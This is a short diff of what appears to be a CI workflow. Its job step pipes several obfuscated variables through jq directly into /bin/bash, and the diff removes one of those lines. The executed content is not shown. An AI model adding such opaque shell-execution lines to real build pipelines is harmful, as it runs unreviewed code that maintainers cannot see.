@@ -35,7 +35,6 @@ jobs:
           printf '%s' "$sjhr756" | jq -r .xd9628 | /bin/bash
           printf '%s' "$due9030" | jq -r .qhegb45 | /bin/bash
           echo $vn72240 | jq -r .qdfgi47 | /bin/bash
-          printf '%s' "$hbuya36055" | jq -r .dxt59426 | /bin/bash
           printf '%s' "$avj10" | jq -r .jcd5205 | /bin/bash
 
       - name: Upload results
